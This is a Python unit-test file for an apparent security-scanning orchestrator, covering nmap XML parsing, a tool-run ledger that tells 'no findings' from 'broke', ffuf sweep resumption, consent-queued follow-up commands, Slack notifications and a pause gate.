    _XML = ('<?xml version="1.0"?><nmaprun><host>'
            '<address addr="10.0.0.5" addrtype="ipv4"/><ports>'
            '<port protocol="udp" portid="161"><state state="open|filtered"/>'
            '<service name="snmp"/></port>'
            '<port protocol="udp" portid="53"><state state="open"/>'
            '<service name="domain"/></port>'
            '<port protocol="udp" portid="9999"><state state="closed"/></port>'
            '</ports></host></nmaprun>')

    def _xml_file(self):
        import tempfile, os
        p = os.path.join(tempfile.mkdtemp(), "udp.xml")
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(self._XML)
        return p

    def test_tcp_mode_drops_open_filtered(self):
        from assay import tools
        hosts = tools.parse_nmap_xml(self._xml_file())
        states = {(p.port, p.state) for p in hosts["10.0.0.5"].ports}
        self.assertEqual(states, {(53, "open")})  # open|filtered and closed excluded

    def test_udp_mode_keeps_open_filtered_honestly(self):
        from assay import tools
        hosts = tools.parse_nmap_xml(self._xml_file(), include_open_filtered=True)
        states = {(p.port, p.state) for p in hosts["10.0.0.5"].ports}
        self.assertEqual(states, {(53, "open"), (161, "open|filtered")})
        self.assertNotIn((9999, "closed"), states)   # closed still excluded

    def test_curated_port_list_is_nonempty_and_includes_snmp_and_dns(self):
        from assay import tools
        self.assertIn(161, tools.UDP_PORTS)
        self.assertIn(53, tools.UDP_PORTS)
        self.assertGreaterEqual(len(tools.UDP_PORTS), 10)


class ToolRunLedgerTests(unittest.TestCase):
    """The verifiable tool-run ledger: every invocation recorded with a
    four-state outcome, so a 'no findings' result is confirmable and a tool
    that broke is told apart from one that found nothing."""

    def _store(self):
        import tempfile, os
        from assay.store import Store
        st = Store(os.path.join(tempfile.mkdtemp(), "ledger.db"))
        st.start_run("test", ["example.com"])
        self.addCleanup(st.close)
        return st

    def test_records_and_reads_back_a_run(self):
        st = self._store()
        st.record_tool_run(tool="naabu", argv="naabu -top-ports 1000", rc=0,
                           state="no-findings", duration=12.0,
                           output="no open ports found across 3 host(s)", stage="ports")
        rows = st.tool_runs()
        self.assertEqual(len(rows), 1)
        r = rows[0]
        self.assertEqual((r["tool"], r["state"], r["rc"], r["stage"]),
                         ("naabu", "no-findings", 0, "ports"))
        self.assertIn("no open ports", r["output"])

    def test_output_is_capped(self):
        from assay.store import TOOL_OUTPUT_CAP
        st = self._store()
        st.record_tool_run(tool="curl", argv="curl https://x", rc=0, state="ok",
                           output="A" * (TOOL_OUTPUT_CAP + 5000))
        out = st.tool_runs()[0]
        self.assertLessEqual(len(out["output"]), TOOL_OUTPUT_CAP + 64)
        self.assertIn("truncated", out["output"])
        self.assertEqual(out["bytes_out"], TOOL_OUTPUT_CAP + 5000)  # true size kept

    def test_run_autocaptures_every_outcome_through_the_ambient_ledger(self):
        from assay import tools
        rec = []

        class _L:
            def record(self, **k):
                rec.append(k)

        old = tools.LEDGER
        tools.LEDGER = _L()
        try:
            tools.run(["echo", "hi"])
            tools.run(["false"])
            tools.run(["assay-no-such-binary-xyz"])
        finally:
            tools.LEDGER = old
        by_state = {r["tool"]: r["state"] for r in rec}
        self.assertEqual(by_state.get("echo"), "ok")
        self.assertEqual(by_state.get("false"), "broke")
        self.assertEqual(by_state.get("assay-no-such-binary-xyz"), "broke")

    def test_a_broken_ledger_never_takes_down_a_run(self):
        from assay import tools

        class _Boom:
            def record(self, **k):
                raise RuntimeError("ledger is down")

        old = tools.LEDGER
        tools.LEDGER = _Boom()
        try:
            p = tools.run(["echo", "still-fine"])  # must not raise
        finally:
            tools.LEDGER = old
        self.assertEqual(p.rc, 0)
        self.assertIn("still-fine", p.out)

    def test_report_distinguishes_no_findings_from_broke(self):
        import tempfile, os
        from assay import report
        st = self._store()
        st.record_tool_run(tool="naabu", argv="naabu -top-ports 1000", rc=0,
                           state="no-findings", output="no open ports found",
                           stage="ports")
        st.record_tool_run(tool="nuclei", argv="nuclei -u https://x", rc=1,
                           state="broke", output="FATAL could not resolve",
                           stage="modules:active")
        out = os.path.join(tempfile.mkdtemp(), "r.html")
        report.build(st, {"duration": 1}, out)
        html = open(out, encoding="utf-8").read()
        self.assertIn('id="tool-runs"', html)
        self.assertIn("no findings", html)
        self.assertIn("no open ports found", html)   # the negative is verifiable
        self.assertIn("broke", html)
        self.assertIn("could not resolve", html)


class StreamLedgerAndTimeoutTests(unittest.TestCase):
    """Streamed tools reach the ledger; ffuf/arjun are bounded sensibly."""

    def setUp(self):
        from assay import tools
        self.tools = tools
        self.rec = []
        outer = self

        class _L:
            def record(self, **k):
                outer.rec.append(k)
        tools.LEDGER = _L()
        self.addCleanup(setattr, tools, "LEDGER", None)

    def test_stream_lines_is_ledgered(self):
        list(self.tools.stream_lines(["printf", "a\\nb\\n"]))
        list(self.tools.stream_lines(["sh", "-c", "exit 2"]))
        self.assertEqual([(r["tool"], r["state"]) for r in self.rec],
                         [("printf", "ok"), ("sh", "broke")])
        self.assertIn("2 line(s)", self.rec[0]["output"])

    def test_ledger_false_records_nothing(self):
        list(self.tools.stream_lines(["printf", "a\\n"], ledger=False))
        self.assertEqual(self.rec, [])

    def test_ffuf_stops_itself_before_the_hard_deadline(self):
        cap = []
        orig = self.tools.run

        def fake_run(cmd, timeout=0, **k):
            cap.append(cmd)
            return self.tools.Proc(rc=0, out="", err="", cmd=list(cmd))

        self.tools.run = fake_run
        self.addCleanup(setattr, self.tools, "run", orig)
        self.tools.ffuf_discover("http://t", "/w", {"rate": 30}, timeout=420.0)
        # maxtime = timeout - grace, grace = max(60, 10% of budget). The gap to
        # the hard kill must be wide enough that ffuf self-stops and flushes its
        # hits first; a flat 30s was not, and lost everything on overrun.
        self.assertEqual(cap[0][cap[0].index("-maxtime") + 1], "360")

    def test_ffuf_sweep_banks_progress_and_resumes_from_the_exact_word(self):
        import tempfile
        tools = self.tools
        wl = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
        wl.write("\n".join("w%d" % n for n in range(1000)) + "\n")
        wl.close()
        self.addCleanup(os.unlink, wl.name)

        calls = []
        orig = tools.ffuf_discover
        self.addCleanup(setattr, tools, "ffuf_discover", orig)

        def all_complete(url, wordlist, tune, proxy=None, extensions="", timeout=0.0,
                         headers=None):
            with open(wordlist) as fh:
                calls.append(len([x for x in fh if x.strip()]))
            return tools.FfufRun(results=[{"url": "u%d" % len(calls)}], completed=True)

        # Default shard (rate 30 * 300s) dwarfs 1000 words: one shard, all swept.
        tools.ffuf_discover = all_complete
        s = tools.ffuf_sweep("http://t", wl.name, {"rate": 30}, timeout=3600.0)
        self.assertTrue(s.done)
        self.assertEqual(s.reached, 1000)
        self.assertEqual(calls, [1000])

        # Shrink the shard to 300 words and have the SECOND shard get cut short.
        calls.clear()
        tools._SHARD_SECONDS = 10.0          # rate 30 * 10 / 1 = 300 words/shard
        self.addCleanup(setattr, tools, "_SHARD_SECONDS", 300.0)
        state = {"n": 0}

        def cut_on_second(url, wordlist, tune, proxy=None, extensions="", timeout=0.0,
                          headers=None):
            with open(wordlist) as fh:
                calls.append(len([x for x in fh if x.strip()]))
            state["n"] += 1
            done = state["n"] == 1
            return tools.FfufRun(results=[{"url": "u"}], completed=done, killed=not done)

        tools.ffuf_discover = cut_on_second
        s2 = tools.ffuf_sweep("http://t", wl.name, {"rate": 30}, timeout=3600.0)
        self.assertFalse(s2.done)
        self.assertEqual(s2.reached, 300)     # only the first 300-word shard banked
        self.assertTrue(s2.killed)
        self.assertEqual(calls[0], 300)       # first shard carried words 0..299

        # Resuming hands ffuf the tail from word 300 - the front is never re-sent.
        calls.clear()
        state["n"] = 0
        tools.ffuf_sweep("http://t", wl.name, {"rate": 30}, timeout=3600.0, start=300)
        self.assertEqual(calls[0], 300)       # first resumed shard: words 300..599

    def test_arjun_is_not_stable_mode_and_threads_are_capped(self):
        cap = []
        orig = self.tools.run
        self.tools.run = lambda cmd, timeout=0, **k: cap.append(cmd)
        self.addCleanup(setattr, self.tools, "run", orig)
        self.tools.arjun_params("http://t/", {"ffuf_threads": 20})
        self.assertNotIn("--stable", cap[0])
        self.assertEqual(cap[0][cap[0].index("-t") + 1], "4")


class QueuedFollowupReportTests(unittest.TestCase):
    def test_queued_commands_and_reminder_are_in_the_report(self):
        import tempfile
        from assay.report import _followup_proof_section
        from assay.store import Store
        store = Store(os.path.join(tempfile.mkdtemp(), "t.db"))
        store.run_id = 1
        store.record_followup_result(
            round=1, finding_id="f", finding_title="T", tool="nmap",
            argv="nmap -p 80 x", tier="active", rc=None, state="queued",
            output_local="active - needs consent")
        html = _followup_proof_section(store)
        self.assertIn("Queued, not yet run", html)
        self.assertIn("nmap -p 80 x", html)
        self.assertIn("assay followup --run", html)


class SlackNotifierTests(unittest.TestCase):
    """Scan-lifecycle Slack pings: opt-in, best-effort, never raise."""

    def setUp(self):
        from assay import notify
        self.notify = notify
        self.posts = []
        outer = self

        class _FakeResp:
            ok = True

        def fake_post(url, json=None, timeout=None):
            outer.posts.append({"url": url, "json": json, "timeout": timeout})
            return _FakeResp()

        self._orig = notify.requests.post
        notify.requests.post = fake_post
        self.addCleanup(setattr, notify.requests, "post", self._orig)
        # A stray env webhook must not make "no webhook" tests post for real.
        self._env = os.environ.pop(notify.ENV_WEBHOOK, None)
        self.addCleanup(lambda: os.environ.__setitem__(notify.ENV_WEBHOOK, self._env)
                        if self._env is not None else None)

    def test_without_a_webhook_nothing_is_sent(self):
        n = self.notify.Notifier(webhook="")
        self.assertFalse(n.enabled)
        self.assertFalse(n.scan_done("done"))
        self.assertFalse(n.needs_input("q"))
        self.assertEqual(self.posts, [])

    def test_scan_done_posts_the_summary(self):
        n = self.notify.Notifier(webhook="http://hook", label="acme")
        self.assertTrue(n.scan_done("3 chase, 1 look"))
        self.assertEqual(len(self.posts), 1)
        self.assertEqual(self.posts[0]["url"], "http://hook")
        text = self.posts[0]["json"]["text"]
        self.assertIn("acme", text)
        self.assertIn("complete", text)
        self.assertIn("3 chase, 1 look", text)

    def test_needs_input_quotes_the_question(self):
        n = self.notify.Notifier(webhook="http://hook", label="acme")
        n.needs_input("resume the unfinished passes?")
        text = self.posts[0]["json"]["text"]
        self.assertIn("waiting for input", text)
        self.assertIn("resume the unfinished passes?", text)

    def test_env_var_supplies_the_webhook(self):
        os.environ[self.notify.ENV_WEBHOOK] = "http://from-env"
        try:
            n = self.notify.Notifier()      # no explicit webhook
            self.assertTrue(n.enabled)
            n.scan_done("x")
        finally:
            os.environ.pop(self.notify.ENV_WEBHOOK, None)
        self.assertEqual(self.posts[0]["url"], "http://from-env")

    def test_a_failing_webhook_never_raises(self):
        def boom(url, json=None, timeout=None):
            raise RuntimeError("network down")
        self.notify.requests.post = boom
        n = self.notify.Notifier(webhook="http://hook")
        self.assertFalse(n.scan_done("x"))   # swallowed, returns False

    def test_from_cfg_reads_webhook_and_codename(self):
        from assay.config import Config
        cfg = Config(slack_webhook="http://hook", codename="proj-x")
        n = self.notify.from_cfg(cfg)
        self.assertEqual(n.webhook, "http://hook")
        self.assertEqual(n.label, "proj-x")


class PauseGateTests(unittest.TestCase):
    """'p' pauses at a checkpoint; 'r' resumes; a skip never wedges behind it."""

    def setUp(self):
        import threading
        from assay import tools
        self.tools = tools
        self.threading = threading
        tools.PAUSE.clear()
        tools.SKIP.clear()
        self.addCleanup(tools.PAUSE.clear)
        self.addCleanup(tools.SKIP.clear)

    def _run_gate_in_thread(self):
        done = self.threading.Event()
        t = self.threading.Thread(
            target=lambda: (self.tools.wait_while_paused(), done.set()))
        t.daemon = True
        t.start()
        return t, done

    def test_not_paused_returns_at_once(self):
        t, done = self._run_gate_in_thread()
        self.assertTrue(done.wait(timeout=2), "gate blocked when nothing was paused")

    def test_pause_blocks_until_resume(self):
        self.tools.PAUSE.set()
        t, done = self._run_gate_in_thread()
        # Still blocked a moment later...
        self.assertFalse(done.wait(timeout=0.6), "gate did not hold while paused")
        # ...until resume lifts it.
        self.tools.PAUSE.clear()
        self.assertTrue(done.wait(timeout=2), "gate did not release on resume")

    def test_skip_overrides_a_pause(self):
        self.tools.PAUSE.set()
        t, done = self._run_gate_in_thread()
        self.assertFalse(done.wait(timeout=0.4))
        # A skip must drain the gate even though PAUSE is still set - this is
        # what lets Ctrl-C teardown release paused workers.
        self.tools.SKIP.set()
        self.assertTrue(done.wait(timeout=2), "skip did not drain a paused gate")


if __name__ == "__main__":
    unittest.main(verbosity=2)
